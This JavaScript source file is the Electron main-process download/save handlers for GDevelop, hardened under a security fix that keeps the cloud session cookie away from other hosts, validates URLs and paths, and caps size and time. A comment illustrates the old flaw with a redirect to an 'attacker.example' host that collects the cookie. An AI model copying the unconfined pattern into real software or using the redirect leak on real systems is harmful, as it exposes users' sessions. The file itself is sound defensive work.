/*
 * ============================================================================
 * UPSTREAM SECURITY PROPOSAL — UP-1: the `local-file-download` /
 * `local-file-save-from-arraybuffer` IPC handlers were unconfined.
 * ============================================================================
 *
 * THE GENERAL ISSUE
 * -----------------
 * This module is the privileged side of a channel the renderer drives: it
 * downloads a URL to a filesystem path, and writes an ArrayBuffer to a
 * filesystem path. It used to do exactly that, on whatever terms the renderer
 * asked for:
 *
 *   - the user's GDevelop cloud session cookie (`gd_resource`) was read from
 *     the Electron cookie store and attached to WHATEVER host the URL named.
 *     Because this is a main-process request with a hand-built header, the
 *     browser's same-origin policy never applies — a hostile host receives
 *     the session value verbatim.
 *   - the URL scheme was unchecked, so `file://` could read a local file.
 *   - `outputPath` was unchecked, so any writable location was reachable.
 *   - there was no byte cap and no overall timeout.
 *
 * The fix: every rule lives in LocalFileDownloadCore (pure, speccable), is
 * checked HERE in the privileged process, and the two handlers now require a
 * caller-declared `basePath` that the output must stay inside.
 *
 * The subtle part — the one that is easy to get wrong — is redirects; see
 * requestThroughRedirects below. That is the only place here where the fix is
 * not a straight validation.
 *
 * See `REVIEW/upstream/upstream.md` for the full rationale and the risk.
 * ============================================================================
 */

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const log = require('electron-log');
const { session } = require('electron');
const {
  LOCAL_FILE_DOWNLOAD_MAX_BYTES,
  LOCAL_FILE_DOWNLOAD_TIMEOUT_MS,
  LOCAL_FILE_DOWNLOAD_MAX_REDIRECTS,
  shouldAttachGDevelopCloudCookie,
  validateLocalFileDownloadRequest,
  validateLocalFileSavePath,
  makeByteCapGuard,
} = require('../../app/src/Utils/LocalFileDownloadCore');

/**
 * Read the GDevelop cloud session cookie from the Electron cookie store.
 *
 * UP-1 note: this function is unchanged from before the fix, and that is the
 * point — the BUG was never here, it was here being called unconditionally.
 * The caller now decides whether the URL's host is entitled to it. Keeping
 * the reader separate from the decision is deliberate: there is exactly one
 * place that attaches the header, and that place is guarded.
 */
const findGDevelopCloudCookieValue = async () => {
  /** @type {import("electron").Cookie[]} */
  let cookies = [];
  try {
    cookies = await session.defaultSession.cookies.get({
      domain: 'gdevelop.io',
      name: 'gd_resource',
    });
  } catch (error) {
    log.error('Error while reading cookies:', error);
  }

  const gdevelopCloudCookieValue = cookies[0] ? cookies[0].value : null;
  return gdevelopCloudCookieValue;
};

/**
 * Resolve the URL through its redirect chain, re-validating every hop and
 * re-deciding the cookie per host.
 *
 * WHY THIS FUNCTION EXISTS AT ALL (the non-obvious part of UP-1):
 *
 *   The obvious fix — "attach the cookie only when the URL is a gdevelop.io
 *   URL" — is NOT ENOUGH. The bundled axios is 0.19.x, and that version
 *   forwards request headers across cross-host redirects. So with the
 *   automatic follow left on, this sequence leaks the session cookie even
 *   though the URL the caller passed was perfectly innocent:
 *
 *       https://gdevelop.io/some-endpoint   ->  302
 *       https://attacker.example/collect    <-  axios resends the Cookie
 *
 *   The fix therefore sets `maxRedirects: 0` and walks the chain itself, so
 *   that at every hop we (a) get to re-run the URL validation and (b) get to
 *   decide again whether that hop's host deserves the cookie. A hop to a
 *   non-gdevelop.io host simply gets no Cookie header.
 *
 * Three details that matter:
 *
 *   - `maxRedirects: 0` stops axios from following for us.
 *   - `validateStatus` accepts 3xx instead of rejecting it. Axios rejects by
 *     default on anything outside 2xx, and we need to READ the 3xx to get its
 *     Location header.
 *   - on a redirect we must `response.data.destroy()`. With
 *     `responseType: 'stream'` the 3xx body is an open socket; not releasing
 *     it leaks a connection per hop.
 */
const requestThroughRedirects = async url => {
  let currentUrl = url;
  for (let hop = 0; hop <= LOCAL_FILE_DOWNLOAD_MAX_REDIRECTS; hop++) {
    // Per hop: read the CURRENT host, not the original URL's host. This line
    // is the one the whole function exists to get right.
    const hostname = new URL(currentUrl).hostname;
    const gdevelopCloudCookieValue = shouldAttachGDevelopCloudCookie(hostname)
      ? await findGDevelopCloudCookieValue()
      : null;

    const response = await axios.get(currentUrl, {
      responseType: 'stream',
      timeout: LOCAL_FILE_DOWNLOAD_TIMEOUT_MS,
      maxRedirects: 0,
      // 3xx must resolve (not reject) so the walk can inspect them.
      validateStatus: status => status >= 200 && status < 400,
      headers: gdevelopCloudCookieValue
        ? {
            Cookie: `gd_resource=${gdevelopCloudCookieValue}`,
          }
        : {},
    });

    if (response.status >= 200 && response.status < 300) {
      return response;
    }

    const location = response.headers ? response.headers.location : null;
    response.data.destroy();
    if (!location) {
      throw new Error(
        `The server answered ${response.status} without a redirect location.`
      );
    }
    const nextUrl = new URL(location, currentUrl).href;
    // Re-run the URL half of the validation on the hop we are about to
    // follow. Passing '.' for the path pair is deliberate: the output path is
    // fixed for the whole transfer and cannot change because of a redirect,
    // so only the URL needs re-checking — and `path.resolve('.')` compared
    // against itself always satisfies the containment rule. Reusing the full
    // validator keeps ONE definition of "is this URL acceptable" instead of a
    // second, subtly-different one here, which is exactly how URL checks
    // drift apart over time.
    const nextHopValidation = validateLocalFileDownloadRequest({
      url: nextUrl,
      outputPath: '.',
      basePath: '.',
      pathLib: path,
    });
    if (!nextHopValidation.ok) {
      throw new Error(nextHopValidation.error);
    }
    currentUrl = nextUrl;
  }
  throw new Error(
    `The download exceeded ${LOCAL_FILE_DOWNLOAD_MAX_REDIRECTS} redirects.`
  );
};

module.exports = {
  /**
   * @param {string} url
   * @param {string} outputPath
   * @param {string} basePath The folder the outputPath must stay inside
   * (security fix UP-1 — see LocalFileDownloadCore for the rules).
   */
  downloadLocalFile: async (url, outputPath, basePath) => {
    const validation = validateLocalFileDownloadRequest({
      url,
      outputPath,
      basePath,
      pathLib: path,
    });
    if (!validation.ok) {
      throw new Error(validation.error);
    }

    // UP-1: validation happens in the PRIVILEGED process, before any socket
    // is opened and before any file is created. Everything the renderer sent
    // is treated as hostile input here — which is the whole point of putting
    // the check on this side rather than in the renderer, where a bug or a
    // tampered build would simply skip it.
    //
    // Only gdevelop.io itself and its subdomains ever see the cloud cookie,
    // on the initial request and on every redirect hop alike.
    log.verbose(`Downloading ${url} to ${outputPath}...`);
    const response = await requestThroughRedirects(url);

    // Create the writer only after the request is successful — the ordering
    // is unchanged from before the fix and is worth keeping: it means a failed
    // request cannot leave an empty file behind at a path we just validated.
    const writer = fs.createWriteStream(outputPath);
    const byteCapGuard = makeByteCapGuard(LOCAL_FILE_DOWNLOAD_MAX_BYTES);

    return new Promise((resolve, reject) => {
      let isRejectedOrResolvedAlready = false;
      let transferWatchdogTimer = null;

      const cleanUpAndReject = err => {
        if (isRejectedOrResolvedAlready) return;
        isRejectedOrResolvedAlready = true;

        if (transferWatchdogTimer) clearTimeout(transferWatchdogTimer);
        try {
          writer.destroy();
        } catch (e) {}
        try {
          response.data.destroy();
        } catch (e) {}
        // Best effort to remove the incomplete file
        try {
          fs.unlinkSync(outputPath);
        } catch (e) {}
        reject(err);
      };

      // Overall transfer watchdog. This is NOT redundant with the axios
      // `timeout` above: axios's timeout covers connection setup and periods
      // of socket inactivity, so a server that dribbles one byte per second
      // keeps the connection "active" forever and never trips it. Rule 5
      // needs a wall-clock bound on the whole transfer, which is what this
      // timer is.
      transferWatchdogTimer = setTimeout(() => {
        cleanUpAndReject(
          new Error(
            `The download timed out after ${LOCAL_FILE_DOWNLOAD_TIMEOUT_MS} ms.`
          )
        );
      }, LOCAL_FILE_DOWNLOAD_TIMEOUT_MS);

      response.data.on('data', chunk => {
        if (!byteCapGuard.accept(chunk)) {
          cleanUpAndReject(
            new Error(
              `The file exceeds the ${LOCAL_FILE_DOWNLOAD_MAX_BYTES} byte download cap.`
            )
          );
        }
      });
      response.data.on('error', cleanUpAndReject);
      writer.on('error', cleanUpAndReject);
      writer.on('finish', () => {
        if (isRejectedOrResolvedAlready) return;
        isRejectedOrResolvedAlready = true;
        clearTimeout(transferWatchdogTimer);
        resolve(true);
      });

      response.data.pipe(writer);
    });
  },
  /**
   * @param {ArrayBuffer} arrayBuffer
   * @param {string} outputPath
   * @param {string} basePath The folder the outputPath must stay inside
   * (security fix UP-1 — same confinement rule as the download).
   */
  saveLocalFileFromArrayBuffer: async (arrayBuffer, outputPath, basePath) => {
    const validation = validateLocalFileSavePath({
      outputPath,
      basePath,
      pathLib: path,
    });
    if (!validation.ok) {
      throw new Error(validation.error);
    }
    // The same rule 4 as the download, applied up front because an
    // ArrayBuffer is already fully in memory: there is no streaming to
    // interrupt, so the honest place to check is before the write. The empty
    // check is a small behaviour addition — the old code happily wrote a
    // 0-byte file.
    if (
      !arrayBuffer ||
      !arrayBuffer.byteLength ||
      arrayBuffer.byteLength > LOCAL_FILE_DOWNLOAD_MAX_BYTES
    ) {
      throw new Error(
        `The payload is empty or exceeds the ${LOCAL_FILE_DOWNLOAD_MAX_BYTES} byte cap.`
      );
    }
    await fs.promises.writeFile(outputPath, Buffer.from(arrayBuffer));
  },
};
